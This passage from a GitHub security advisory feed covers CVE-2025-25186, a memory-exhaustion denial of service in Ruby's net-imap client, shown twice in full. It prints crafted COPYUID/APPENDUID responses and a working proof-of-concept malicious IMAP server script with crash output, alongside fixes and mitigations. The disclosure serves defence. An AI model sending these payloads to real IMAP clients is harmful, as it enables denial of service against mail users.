  imap.disconnect if imap
end
</code></pre>
<p>Use <code>ulimit</code> to limit the process's virtual memory.  The following example limits virtual memory to 1GB:</p>
<pre><code class="language-console">$ ( ulimit -v 1000000 &amp;&amp; exec ./poc.rb )
Server started on port 34291
Client connecting,..
Received: RUBY0001 CAPABILITY
Sending: * OK [APPENDUID 1 1:4294967295] too large?
Sending: * OK [COPYUID 1 1:4294967295 1:4294967295] too large?
Error in server: Connection reset by peer @ io_fillbuf - fd:9  (Errno::ECONNRESET)
Error in client: failed to allocate memory (NoMemoryError)
/gems/net-imap-0.5.5/lib/net/imap.rb:3271:in 'Net::IMAP#get_tagged_response': failed to allocate memory (NoMemoryError)
        from /gems/net-imap-0.5.5/lib/net/imap.rb:3371:in 'block in Net::IMAP#send_command'
        from /rubylibdir/monitor.rb:201:in 'Monitor#synchronize'
        from /rubylibdir/monitor.rb:201:in 'MonitorMixin#mon_synchronize'
        from /gems/net-imap-0.5.5/lib/net/imap.rb:3353:in 'Net::IMAP#send_command'
        from /gems/net-imap-0.5.5/lib/net/imap.rb:1128:in 'block in Net::IMAP#capability'
        from /rubylibdir/monitor.rb:201:in 'Monitor#synchronize'
        from /rubylibdir/monitor.rb:201:in 'MonitorMixin#mon_synchronize'
        from /gems/net-imap-0.5.5/lib/net/imap.rb:1127:in 'Net::IMAP#capability'
        from /workspace/poc.rb:70:in '&lt;main&gt;'
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ruby/net-imap/security/advisories/GHSA-7fc5-f82f-cx69">https://github.com/ruby/net-imap/security/advisories/GHSA-7fc5-f82f-cx69</a></li>
<li><a href="https://github.com/ruby/net-imap/commit/70e3ddd071a94e450b3238570af482c296380b35">https://github.com/ruby/net-imap/commit/70e3ddd071a94e450b3238570af482c296380b35</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25186">https://nvd.nist.gov/vuln/detail/CVE-2025-25186</a></li>
<li><a href="https://github.com/ruby/net-imap/commit/c8c5a643739d2669f0c9a6bb9770d0c045fd74a3">https://github.com/ruby/net-imap/commit/c8c5a643739d2669f0c9a6bb9770d0c045fd74a3</a></li>
<li><a href="https://github.com/ruby/net-imap/commit/cb92191b1ddce2d978d01b56a0883b6ecf0b1022">https://github.com/ruby/net-imap/commit/cb92191b1ddce2d978d01b56a0883b6ecf0b1022</a></li>
<li><a href="https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html">https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html</a></li>
<li><a href="https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html">https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html</a></li>
<li><a href="https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html">https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/net-imap/CVE-2025-25186.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/net-imap/CVE-2025-25186.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-7fc5-f82f-cx69">https://github.com/advisories/GHSA-7fc5-f82f-cx69</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7fc5-f82f-cx69</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-10T17:42:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[net-imap] Possible DoS by memory exhaustion in net-imap]]></title>
        <id>https://github.com/advisories/GHSA-7fc5-f82f-cx69</id>
        <link href="https://github.com/advisories/GHSA-7fc5-f82f-cx69"/>
        <updated>2025-02-11T21:39:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There is a possibility for denial of service by memory exhaustion in <code>net-imap</code>'s response parser.  At any time while the client is connected, a malicious server can send  can send highly compressed <code>uid-set</code> data which is automatically read by the client's receiver thread.  The response parser uses <code>Range#to_a</code> to convert the <code>uid-set</code> data into arrays of integers, with no limitation on the expanded size of the ranges.</p>
<h3 id="details">Details</h3>
<p>IMAP's <code>uid-set</code> and <code>sequence-set</code> formats can compress ranges of numbers, for example: <code>"1,2,3,4,5"</code> and <code>"1:5"</code> both represent the same set.  When <code>Net::IMAP::ResponseParser</code> receives <code>APPENDUID</code> or <code>COPYUID</code> response codes, it expands each <code>uid-set</code> into an array of integers.  On a 64 bit system, these arrays will expand to 8 bytes for each number in the set.  A malicious IMAP server may send specially crafted <code>APPENDUID</code> or <code>COPYUID</code> responses with very large <code>uid-set</code> ranges.</p>
<p>The <code>Net::IMAP</code> client parses each server response in a separate thread, as soon as each responses is received from the server.  This attack works even when the client does not handle the <code>APPENDUID</code> or <code>COPYUID</code> responses.</p>
<p>Malicious inputs:</p>
<pre><code class="language-ruby"># 40 bytes expands to ~1.6GB:
"* OK [COPYUID 1 1:99999999 1:99999999]\r\n"

# Worst *valid* input scenario (using uint32 max),
# 44 bytes expands to 64GiB:
"* OK [COPYUID 1 1:4294967295 1:4294967295]\r\n"

# Numbers must be non-zero uint32, but this isn't validated.  Arrays larger than
# UINT32_MAX can be created.  For example, the following would theoretically
# expand to almost 800 exabytes:
"* OK [COPYUID 1 1:99999999999999999999 1:99999999999999999999]\r\n"
</code></pre>
<p>Simple way to test this:</p>
<pre><code class="language-ruby">require "net/imap"

def test(size)
  input = "A004 OK [COPYUID 1 1:#{size} 1:#{size}] too large?\r\n"
  parser = Net::IMAP::ResponseParser.new
  parser.parse input
end

test(99_999_999)
</code></pre>
<h3 id="fixes">Fixes</h3>
<h4 id="preferred-fix-minor-api-changes">Preferred Fix, minor API changes</h4>
<p>Upgrade to v0.4.19, v0.5.6, or higher, and configure:</p>
<pre><code class="language-ruby"># globally
Net::IMAP.config.parser_use_deprecated_uidplus_data = false
# per-client
imap = Net::IMAP.new(hostname, ssl: true,
                               parser_use_deprecated_uidplus_data: false)
imap.config.parser_use_deprecated_uidplus_data = false
</code></pre>
<p>This replaces <code>UIDPlusData</code> with <code>AppendUIDData</code> and <code>CopyUIDData</code>.  These classes store their UIDs as <code>Net::IMAP::SequenceSet</code> objects (<em>not</em> expanded into arrays of integers).  Code that does not handle <code>APPENDUID</code> or <code>COPYUID</code> responses will not notice any difference.  Code that does handle these responses <em>may</em> need to be updated.  See the documentation for <a href="https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html">UIDPlusData</a>, <a href="https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html">AppendUIDData</a> and <a href="https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html">CopyUIDData</a>.</p>
<p>For v0.3.8, this option is not available.
For v0.4.19, the default value is <code>true</code>.
For v0.5.6, the default value is <code>:up_to_max_size</code>.
For v0.6.0, the only allowed value will be <code>false</code>  <em>(<code>UIDPlusData</code> will be removed from v0.6)</em>.</p>
<h4 id="mitigation-backward-compatible-api">Mitigation, backward compatible API</h4>
<p>Upgrade to v0.3.8, v0.4.19, v0.5.6, or higher.</p>
<p>For backward compatibility, <code>uid-set</code> can still be expanded into an array, but a maximum limit will be applied.</p>
<p>Assign <code>config.parser_max_deprecated_uidplus_data_size</code> to set the maximum <code>UIDPlusData</code> UID set size.
When <code>config.parser_use_deprecated_uidplus_data == true</code>, larger sets will raise <code>Net::IMAP::ResponseParseError</code>.
When  <code>config.parser_use_deprecated_uidplus_data == :up_to_max_size</code>, larger sets will use <code>AppendUIDData</code> or <code>CopyUIDData</code>.</p>
<p>For v0.3,8, this limit is <em>hard-coded</em> to 10,000, and larger sets will always raise <code>Net::IMAP::ResponseParseError</code>.
For v0.4.19, the limit defaults to 1000.
For v0.5.6, the limit defaults to 100.
For v0.6.0, the limit will be ignored  <em>(<code>UIDPlusData</code> will be removed from v0.6)</em>.</p>
<h4 id="please-note-unhandled-responses">Please Note: unhandled responses</h4>
<p>If the client does not add response handlers to prune unhandled responses, a malicious server can still eventually exhaust all client memory, by repeatedly sending malicious responses.  However, <code>net-imap</code> has always retained unhandled responses, and it has always been necessary for long-lived connections to prune these responses.  <em>This is not significantly different from connecting to a trusted server with a long-lived connection.</em>  To limit the maximum number of retained responses, a simple handler might look something like the following:</p>
<pre><code class="language-ruby">limit = 1000
imap.add_response_handler do |resp|
  next unless resp.respond_to?(:name) &amp;&amp; resp.respond_to?(:data)
  name = resp.name
  code = resp.data.code&amp;.name if resp.data.respond_to?(:code)
  if Net::IMAP::VERSION &gt; "0.4.0"
    imap.responses(name) { _1.slice!(0...-limit) }
    imap.responses(code) { _1.slice!(0...-limit) }
  else
    imap.responses(name).slice!(0...-limit)
    imap.responses(code).slice!(0...-limit)
  end
end
</code></pre>
<h3 id="proof-of-concept">Proof of concept</h3>
<p>Save the following to a ruby file (e.g: <code>poc.rb</code>) and make it executable:</p>
<pre><code class="language-ruby">#!/usr/bin/env ruby
require 'socket'
require 'net/imap'

if !defined?(Net::IMAP.config)
  puts "Net::IMAP.config is not available"
elsif !Net::IMAP.config.respond_to?(:parser_use_deprecated_uidplus_data)
  puts "Net::IMAP.config.parser_use_deprecated_uidplus_data is not available"
else
  Net::IMAP.config.parser_use_deprecated_uidplus_data = :up_to_max_size
  puts "Updated parser_use_deprecated_uidplus_data to :up_to_max_size"
end

size = Integer(ENV["UID_SET_SIZE"] || 2**32-1)

def server_addr
  Addrinfo.tcp("localhost", 0).ip_address
end

def create_tcp_server
  TCPServer.new(server_addr, 0)
end

def start_server
  th = Thread.new do
    yield
  end
  sleep 0.1 until th.stop?
end

def copyuid_response(tag: "*", size: 2**32-1, text: "too large?")
  "#{tag} OK [COPYUID 1 1:#{size} 1:#{size}] #{text}\r\n"
end

def appenduid_response(tag: "*", size: 2**32-1, text: "too large?")
  "#{tag} OK [APPENDUID 1 1:#{size}] #{text}\r\n"
end

server = create_tcp_server
port = server.addr[1]
puts "Server started on port #{port}"

# server
start_server do
  sock = server.accept
  begin
    sock.print "* OK test server\r\n"
    cmd = sock.gets("\r\n", chomp: true)
    tag = cmd.match(/\A(\w+) /)[1]
    puts "Received: #{cmd}"

    malicious_response = appenduid_response(size:)
    puts "Sending: #{malicious_response.chomp}"
    sock.print malicious_response

    malicious_response = copyuid_response(size:)
    puts "Sending: #{malicious_response.chomp}"
    sock.print malicious_response
    sock.print "* CAPABILITY JUMBO=UIDPLUS PROOF_OF_CONCEPT\r\n"
    sock.print "#{tag} OK CAPABILITY completed\r\n"

    cmd = sock.gets("\r\n", chomp: true)
    tag = cmd.match(/\A(\w+) /)[1]
    puts "Received: #{cmd}"
    sock.print "* BYE If you made it this far, you passed the test!\r\n"
    sock.print "#{tag} OK LOGOUT completed\r\n"
  rescue Exception =&gt; ex
    puts "Error in server: #{ex.message} (#{ex.class})"
  ensure
    sock.close
    server.close
  end
end

# client
begin
  puts "Client connecting,.."
  imap = Net::IMAP.new(server_addr, port: port)
  puts "Received capabilities: #{imap.capability}"
  pp responses: imap.responses
  imap.logout
rescue Exception =&gt; ex
  puts "Error in client: #{ex.message} (#{ex.class})"
  puts ex.full_message
ensure
  imap.disconnect if imap
end
</code></pre>
<p>Use <code>ulimit</code> to limit the process's virtual memory.  The following example limits virtual memory to 1GB:</p>
<pre><code class="language-console">$ ( ulimit -v 1000000 &amp;&amp; exec ./poc.rb )
Server started on port 34291
Client connecting,..
Received: RUBY0001 CAPABILITY
Sending: * OK [APPENDUID 1 1:4294967295] too large?
Sending: * OK [COPYUID 1 1:4294967295 1:4294967295] too large?
Error in server: Connection reset by peer @ io_fillbuf - fd:9  (Errno::ECONNRESET)
Error in client: failed to allocate memory (NoMemoryError)
/gems/net-imap-0.5.5/lib/net/imap.rb:3271:in 'Net::IMAP#get_tagged_response': failed to allocate memory (NoMemoryError)
        from /gems/net-imap-0.5.5/lib/net/imap.rb:3371:in 'block in Net::IMAP#send_command'
        from /rubylibdir/monitor.rb:201:in 'Monitor#synchronize'
        from /rubylibdir/monitor.rb:201:in 'MonitorMixin#mon_synchronize'
        from /gems/net-imap-0.5.5/lib/net/imap.rb:3353:in 'Net::IMAP#send_command'
        from /gems/net-imap-0.5.5/lib/net/imap.rb:1128:in 'block in Net::IMAP#capability'
        from /rubylibdir/monitor.rb:201:in 'Monitor#synchronize'
        from /rubylibdir/monitor.rb:201:in 'MonitorMixin#mon_synchronize'
        from /gems/net-imap-0.5.5/lib/net/imap.rb:1127:in 'Net::IMAP#capability'
        from /workspace/poc.rb:70:in '&lt;main&gt;'
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ruby/net-imap/security/advisories/GHSA-7fc5-f82f-cx69">https://github.com/ruby/net-imap/security/advisories/GHSA-7fc5-f82f-cx69</a></li>
<li><a href="https://github.com/ruby/net-imap/commit/70e3ddd071a94e450b3238570af482c296380b35">https://github.com/ruby/net-imap/commit/70e3ddd071a94e450b3238570af482c296380b35</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25186">https://nvd.nist.gov/vuln/detail/CVE-2025-25186</a></li>
<li><a href="https://github.com/ruby/net-imap/commit/c8c5a643739d2669f0c9a6bb9770d0c045fd74a3">https://github.com/ruby/net-imap/commit/c8c5a643739d2669f0c9a6bb9770d0c045fd74a3</a></li>
<li><a href="https://github.com/ruby/net-imap/commit/cb92191b1ddce2d978d01b56a0883b6ecf0b1022">https://github.com/ruby/net-imap/commit/cb92191b1ddce2d978d01b56a0883b6ecf0b1022</a></li>
<li><a href="https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html">https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html</a></li>
<li><a href="https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html">https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html</a></li>
<li><a href="https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html">https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/net-imap/CVE-2025-25186.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/net-imap/CVE-2025-25186.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-7fc5-f82f-cx69">https://github.com/advisories/GHSA-7fc5-f82f-cx69</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7fc5-f82f-cx69</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-10T17:42:43.000Z</published>
    </entry>
</feed>